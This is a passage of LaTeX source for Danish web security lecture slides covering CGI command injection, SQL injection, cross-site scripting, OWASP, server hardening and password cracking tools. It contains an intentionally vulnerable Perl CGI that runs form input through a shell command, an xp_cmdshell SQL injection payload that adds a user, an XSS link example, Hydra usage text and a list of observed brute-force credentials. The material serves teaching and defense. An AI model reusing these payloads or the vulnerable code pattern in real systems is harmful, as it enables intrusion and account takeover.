\item databasesprog - meget kraftfuldt
\item mange databasesystemer giver mulighed for specifik tildeling af
  privilegier "grant" 
  \end{list2}
\item JAVA
\begin{list2}
\item generelt programmeringssprog
\item bytecode verifikation
\item indbygget sandbox funktionalitet 
\end{list2}
\item Perl og andre generelle programmeringssprog
\item Pas på shell escapes!!!
\end{list1}

\slide{Hello world of insecure web CGI}

\begin{list1}
\item Demo af et sårbart system - badfinger
\item Løsning:
\begin{list2}
\item Kalde finger kommandoen
\item et Perl script
\item afvikles som CGI 
\item standard Apache HTTPD 1.3 server
\end{list2}
\end{list1}

\slide{De vitale - og usikre dele}

{\small
\begin{verbatim}
print "Content-type: text/html\n\n<html>";
print "<body bgcolor=#666666 leftmargin=20 topmargin=20"; 
print "marginwidth=20 marginheight=20>";
print <<XX;
<h1>Bad finger command!</h1>
<HR COLOR=#000>
<form method="post" action="bad_finger.cgi">
Enter userid: <input type="text" size="40" name="command">
</form>
<HR COLOR=#000>
XX
if(&ReadForm(*input)){
    print "<pre>\n";
    print "will execute:\n/usr/bin/finger $input{'command'}\n";
    print "<HR COLOR=#000>\n";
    print `/usr/bin/finger $input{'command'}`;
    print "<pre>\n";
}
\end{verbatim}}


\slide{SQL injection}

\begin{list1}
\item SQL Injection FAQ 
\link{http://www.sqlsecurity.com}:
\begin{alltt}
\small  
Set myRecordset = myConnection.execute
("SELECT * FROM myTable
WHERE someText ='" & request.form("inputdata") & "'")  
med input: ' exec master..xp_cmdshell 'net user test testpass /ADD' --
modtager og udfører serveren:
SELECT * FROM myTable 
WHERE someText ='' exec master..xp_cmdshell
'net user test testpass /ADD'--' 
\end{alltt}
\item -- er kommentar i SQL
\end{list1}

\slide{Er SQL injection almindeligt?}


\begin{list1}
\item Ja, meget almindeligt!
\item Prøv at søge med google  
\end{list1}

\hlkimage{5cm}{images/database-hackers-handbook.jpg}
\begin{list1}
\item \emph{The Database Hacker's Handbook : Defending Database Servers
} David  Litchfield, Chris  Anley, John  Heasman, Bill  Grindlay,
Wiley 2005 ISBN: 0764578014
\end{list1}


\slide{Sqlmap}

\begin{quote}\small
sqlmap is an open source penetration testing tool that automates the process of detecting and exploiting SQL injection flaws and taking over of database servers. It comes with a powerful detection engine, many niche features for the ultimate penetration tester and a broad range of switches lasting from database fingerprinting, over data fetching from the database, to accessing the underlying file system and executing commands on the operating system via out-of-band connections.

Features
\end{quote}

\begin{list1}
\item Automatic SQL injection and database takeover tool
\link{http://sqlmap.org/}
\end{list1}


\slide{sqlmap features}

\hlkimage{20cm}{sqlmap-features-1.png}

\slide{JAVA programmering}

\begin{list1}
\item Hvorfor ikke bare bruge JAVA?
\item JAVA karakteristik
\begin{list2}
\item automatisk garbage collection
\item bytecode verifikation på
\item mulighed for signeret kode
\item beskyldes for at være langsomt
\item platformsuafhængigt
\end{list2}
\item JAVA just in Time (JIT) er sammenligneligt med kompileret C
\item god sikkerhedsmodel - men problemer i implementationerne
\item JVM - den virtuelle maskine er dog skrevet i C og udsat for angreb
\end{list1}




\slide{Cross-site scripting}

\begin{list1}
\item Hvis der inkluderes brugerinput I websider som vises, kan
der måske indføjes ekstra information/kode.
\item Hvis et CGI program, eksempelvis comment.cgi blot bruger værdien af "mycomment" vil 
følgende URL give anledning til cross-site scripting
\begin{alltt}
<A HREF="http://example.com/comment.cgi?
mycomment=<SCRIPT>malicious code</SCRIPT>
">Click here</A>  
\end{alltt}
\item Hvis der henvises til kode kan det endda give anledning til
afvikling i anden "security context"
\item Kilde/inspiration:
  \link{http://www.cert.org/advisories/CA-2000-02.html} 
\end{list1}



\slide{Opsummering websikkerhed}

\begin{list1}
\item Husk hidden fields er ikke mere skjulte end
"view source"-knappen i browseren
\item serverside validering er nødvendigt
\item SQL injection er nemt at udføre og almindeligt
\item Cross-site scripting kan have uanede muligheder
\end{list1}


\slide{OWASP top ten}

\hlkimage{16cm}{owasp.jpg}

\begin{quote}
The OWASP Top Ten provides a minimum standard for web application
security. The OWASP Top Ten represents a broad consensus about what
the most critical web application security flaws are.  
\end{quote}

\begin{list1}
\item The Open Web Application Security Project (OWASP) 
\item OWASP har gennem flere år udgivet en liste over de 10 vigtigste
  sikkerhedsproblemer for webapplikationer  
\item \link{http://www.owasp.org}
\end{list1}


\slide{OWASP WebGoat}

\hlkimage{14cm}{WebGoat.png}

\begin{list1}
\item WebGoat fra OWASP, \link{http://www.owasp.org}
\item Træningsmiljø til webhacking
\item Downloades som Zipfil og kan afvikles direkte på en Windows laptop
\end{list1}

\link{https://www.owasp.org}


\slide{Udviklingsstandarder}

\begin{list1}
\item Hvad gør I for at undgå problemer som de her nævnte?
- kan man gøre mere?
\item Man børe være klar over hvilke teknologier man bruger
\item Standardiser på et mindre antal produkter, biblioteker, sprog
\item Regler og procedurer skal hele tiden opdateres:
\begin{list2}
\item Kvalitetssikring
\item Retningslinier for tilladte tags
\item Retningslinier for brug af SQL
\end{list2}

\item Ved at fokusere på antallet af produkter kan man måske
  indskrænke mulighederne for fejl, høj kvalitet er ofte mere sikkert

\item {\bf nye produkter kan være farlige til man lærer dem at kende!}
\end{list1}

\slide{Retningslinier}

\begin{list2}
\item Hvis der ikke findes retningslinier for udvikling så etabler disse
\item eksempel:\\
javascript må gerne benyttes til at validere forms for at give hurtig
feedback til brugeren
\item serveren der modtager input fra brugeren validerer alle data
  sikkerhedsmæssigt 
\item Retningslinierne er medvirkende til at foretage
en afbalanceret investering i sikkerheden
\item undgå dyre hovsa løsninger
\item undgå huller i sikkerheden, ens niveau

\item Der findes vejledninger til både gamle og nye sprog/systemer, \\
eks Ruby On Rails Security Guide 
\link{http://guides.rubyonrails.org/security.html}
\end{list2}



\slide{Change management}

\begin{list1}
\item Er der tilstrækkeligt med fokus på software i produktion
\item Kan en vilkårlig server nemt reetableres
\item Foretages rettelser direkte på produktionssystemer
\item Er der fall-back plan
\item Burde være god systemadministrator praksis
\vskip 2cm
\item Undgå også opdatering af prod databaser med manuelle SQL queries
\end{list1}


\slide{Algoritmer - kryptografi}

\begin{quote}
hvorfor det ikke er nok at bruge en XOR til at sikre kodeord?
\end{quote}

\pause
\begin{list1}
\item Eksempel: IBM Net.Commerce/WebSphere\\
Der blev fundet en sårbarhed, og ret
hurtigt kom et værktøj der automatiserede 
\item SUQ.DIQ version 1.00
by xor37h and darkman of SMERSH
Danish Design

\item Description:\\
A Win32 application, developed in assembly, for encrypting and decrypting
passwords from IBM Net.Commerce, WebSphere and possibly other IBM and Lotus applications
 aswell.
\item \link{http://about-threats.trendmicro.com/archiveMalware.aspx?language=au&name=TROJ_SUDI.A}
\item STOR RISIKO FOR FEJL - brug hashalgoritme MD5 eller SHA med \emph{salt}
\end{list1}

\vskip 1cm
\centerline{\Large Oldgammel sårbarhed ... kunne da ikke ske idag?}

\slide{Cisco IOS password}

\begin{quote}
Title: Cisco's new password hashing scheme easily cracked\\

Description: In an astonishing decision that has left crytographic
experts scratching their heads, engineer's for Cisco's IOS operating
system chose to switch to a {\bf one-time SHA256 encoding - without salt} -
for storing passwords on the device. This decision leaves password
hashes vulnerable to high-speed cracking - modern graphics cards can
compute over {\bf 2 billion SHA256 hashes in a second - and is actually
considerably less secure than Cisco's previous implementation.} As users
cannot downgrade their version of IOS without a complete reinstall, and
no fix is yet available, security experts are urging users to avoid
upgrades to IOS version 15 at this time.
\end{quote}

Reference: via SANS @RISK newsletter\\
\link{http://arstechnica.com/security/2013/03/cisco-switches-to-weaker-hashing-scheme-passwords-cracked-wide-open/}

\slide{Poul-Henning Kamp @bsdphk - md5crypt}

\hlkimage{15cm}{bsdphk-on-cisco-pw-hash.png}

Poul-Henning Kamp @bsdphk er forfatter md5crypt som Cisco brugte\\
\link{http://phk.freebsd.dk/sagas/md5crypt.html}

\slide{Cracking passwords}

\begin{list2}
\item Hashcat is the world's fastest CPU-based password recovery tool.
\item oclHashcat-plus is a GPGPU-based multi-hash cracker using a brute-force attack (implemented as mask attack), combinator attack, dictionary attack, hybrid attack, mask attack, and rule-based attack.
\item oclHashcat-lite is a GPGPU cracker that is optimized for cracking performance. Therefore, it is limited to only doing single-hash cracking using Markov attack, Brute-Force attack and Mask attack.
\item John the Ripper password cracker old skool men stadig nyttig
\end{list2}

Source:\\
\link{http://hashcat.net/wiki/}\\
\link{http://www.openwall.com/john/}



\slide{Deadly sins bogen}

\hlkimage{8cm}{24-deadly.jpg}

\begin{list1}
\item \emph{24 Deadly Sins of Software Security} 
Michael Howard, David LeBlanc, John Viega 2. udgave, første hed 19 Deadly Sins
\end{list1}


\slide{Apache HTTPD hærdning}

\begin{list2}
\item Apache cookbook, færrest mulige moduler
\item Security focus artikel
\emph{Securing Apache 2: Step-by-Step}
af Artur Maj, fra 2004 men stadig relevant
\link{http://www.securityfocus.com/infocus/1786}

\item Udskifte standard httpd.conf med en
  kortere og overskuelig udgave\\ - evt. splitte til httpd.conf,
  virtual.conf, ssl.conf osv.
\item Standard httpd.conf er over 1000 linier
\item mine httpd.conf er ca. 300 linier - 130 uden kommentarer!
\item Jails og chroot er en god ide
\item Idag findes også flere bøger om PHP sikkerhed, Apache sikkerhed, \verb+mod_security+ konfiguration m.v.
\end{list2}



\slide{Hærdning af PHP websystemer}

\begin{list1}
\item Anbefalinger: brug en opdateret PHP med default indstillinger
  som udgangspunkt, mere sikre defaults
\item Bemærk især: 
\begin{list2}
\item \verb+register_globals+ - tillader overtagelse af variable fra
  URL parametre
\item \verb+allow_url_open+ - tillader at åbne \emph{filer} med http://    
\item Sæt Apache til at forstå både .php og .inc m.fl. som PHP filer
\end{list2}
\item hærdet PHP \link{http://www.hardened-php.net/suhosin.127.html}
\item Apache Security bogen, eventuelt kombineret med \verb+mod_security+
\end{list1}


\slide{Opsummering - hvad skal man gøre}

\begin{quote}\Large
Installation, konfiguration, overvågning
\end{quote}

\begin{list1}
\item Hærde servere
\item Konfigurere applikationer
\item Programmere sikkert
\item Sikre sine netværk bedst muligt 
\item Overvej at blokere trafik indefra
\item og husk den menneskelige faktor
\item KRAV til password sikkerhed
\item KONFIGURATION til at sikre dette krav
\item uddannelse i produkterne/programmerne/systmerne!
\end{list1}





\slide{Open Mike night ...}

\vskip 3 cm

\centerline{\Large Hvad glemte jeg? Kom med dine favoritter \smiley}

evalg, DNS censur, NemID bashing, malware sucks, Android malware, iPhone malware?

Did you notice how a lot of the links in this presentation uses HTTPS - encrypted

\myquestionspage

\slide{Extra slides, in case a question pops up}
\slide{brute force}


\begin{alltt}
\small
Hydra v2.5 (c) 2003 by van Hauser / THC <vh@thc.org>
Syntax: hydra [[[-l LOGIN|-L FILE] [-p PASS|-P FILE]] | [-C FILE]] 
[-o FILE] [-t TASKS] [-g TASKS] [-T SERVERS] [-M FILE] [-w TIME] 
[-f] [-e ns] [-s PORT] [-S] [-vV] server service [OPT]

Options:
  -S        connect via SSL
  -s PORT   if the service is on a different default port, define it here
  -l LOGIN  or -L FILE login with LOGIN name, or load several logins from FILE
  -p PASS   or -P FILE try password PASS, or load several passwords from FILE
  -e ns     additional checks, "n" for null password, "s" try login as pass
  -C FILE   colon seperated "login:pass" format, instead of -L/-P option
  -M FILE   file containing server list (parallizes attacks, see -T)
  -o FILE   write found login/password pairs to FILE instead of stdout
...  
\end{alltt}

\link{http://www.thc.org/thc-hydra/}\\
hvad betyder bruteforcing?

\slide{bruteforge}

\begin{quote}
Why another one?
Words are generated in a bruteforce fashion but, when a condition takes place, it skips forward to the next valid word!
User can define charset, maximum number of uses for every char in charset, patterns/repetitions to exclude.
User can trim down number of combinations generated excluding 'invalid' words by setting some criteria.
\end{quote}

\begin{list1}
\item Hvordan laver man rigtigt bruteforce?
\item Skal man teste ALT - A, AA, AAA, AAAA, AAAAA, AAAAAAAAA
\end{list1}

\link{http://masterzorag.blogspot.com/}

\slide{Real life bruteforce? Found in Jan 2012}
\begin{alltt}
root:admin:87.x.202.63
admin:admin:91.x.104.207
admin:0767390145:x.72.110.84
admin:0767390145:89.xx.163.73
admin:0767390145:89.x.142.153
root:root:186.x.39.228
admin:admin:189.x.160.98
root:dumn3z3u:189.x.216.232
admin:0767390145:189.x.36.247
root:admin:169.x.34.145
root:default:66.x.33.138
root:default:66.x.33.138
root:111111:213.x.89.250
admin:admin:91.x.52.114
admin:0767390145:195.x.246.131
admin:0767390145:195.x.246.131
\end{alltt}

\slide{John the ripper}

\begin{quote}
John the Ripper is a fast password cracker, currently available for
many flavors of Unix (11 are officially supported, not counting
different architectures), Windows, DOS, BeOS, and OpenVMS. Its primary
purpose is to detect weak Unix passwords. Besides several crypt(3)
password hash types most commonly found on various Unix flavors,
supported out of the box are Kerberos AFS and Windows NT/2000/XP/2003
LM hashes, plus several more with contributed patches.   
\end{quote}

\begin{list1}
\item UNIX passwords kan knækkes med alec Muffets kendte Crack program
  eller eksempelvis John The Ripper \link{http://www.openwall.com/john/}  
\item Jeg bruger selv John The Ripper
\end{list1}

\slide{Cracking passwords}

\begin{list2}
\item Hashcat is the world's fastest CPU-based password recovery tool.
\item oclHashcat-plus is a GPGPU-based multi-hash cracker using a brute-force attack (implemented as mask attack), combinator attack, dictionary attack, hybrid attack, mask attack, and rule-based attack.
\item oclHashcat-lite is a GPGPU cracker that is optimized for cracking performance. Therefore, it is limited to only doing single-hash cracking using Markov attack, Brute-Force attack and Mask attack.
\item John the Ripper password cracker old skool men stadig nyttig
\end{list2}

Source:\\
\link{http://hashcat.net/wiki/}\\
\link{http://www.openwall.com/john/}

\slide{Parallella John}

\hlkimage{20cm}{parallella-john.png}

\link{https://twitter.com/solardiz/status/492037995080712192}

Warning: FPGA hacking - not finished part of presentation \smiley

\slide{Stacking Parallella boards}
\hlkimage{16cm}{4BoardStack.jpg}

\link{http://www.parallella.org/power-supply/}


\slide{VikingScan.org - free portscanning}

\hlkimage{18cm}{vikingscan-reklame.png}
%\vskip 1cm 
%\centerline{\link{http://www.vikingscan.org}}


\hlkprofiluk




\slide{CISSP fra ISC2}

\hlkimage{16cm}{images/cissp-logo.png}

\begin{list1}
\item Primære website: \link{http://www.isc2.org}
\item Vigtigt link \link{http://www.cccure.org/}
\item Den kræver mindst 3 års erfaring indenfor et relevant fagområde
\item Multiple choice 6 timer 250 spørgsmål - kan tages i Danmark
\end{list1}

\slide{Hacker - cracker}

{\bfseries Det korte svar - drop diskussionen}

%Det lidt længere svar:\\
Det havde oprindeligt en anden betydning, men medierne har taget
udtrykket til sig - og idag har det begge betydninger. 

{\color{red}\hlkbig Idag er en hacker stadig en der bryder ind i systemer!}

ref. Spafford, Cheswick, Garfinkel, Stoll, ...
- alle kendte navne indenfor sikkerhed

Hvis man vil vide mere kan man starte med:
\begin{list2}
\item \emph{Cuckoo's Egg: Tracking a Spy Through the Maze of Computer
 Espionage},  Clifford Stoll  
\item \emph{Hackers: Heroes of the Computer Revolution},
Steven Levy
\item \emph{Practical Unix and Internet Security},
Simson Garfinkel, Gene Spafford, Alan Schwartz 
\end{list2}

\slide{Definition af hacking, oprindeligt}

\begin{quote}
Eric Raymond, der vedligeholder en ordbog over computer-slang (The Jargon File) har blandt andet følgende forklaringer på ordet hacker:
\begin{list2}
\item En person, der nyder at undersøge detaljer i programmerbare systemer og hvordan man udvider deres anvendelsesmuligheder i modsætning til de fleste brugere, der bare lærer det mest nødvendige
\item En som programmerer lidenskabligt (eller enddog fanatisk) eller en der foretrækker at programmere fremfor at teoretiserer om det
\item En ekspert i et bestemt program eller en der ofter arbejder med eller på det; som i "en Unixhacker".
\end{list2}
\end{quote}

\begin{list1}
\item Kilde: Peter Makholm, \link{http://hacking.dk}
\item Benyttes stadig i visse sammenhænge se \link{http://labitat.dk}
\end{list1}



\end{document}
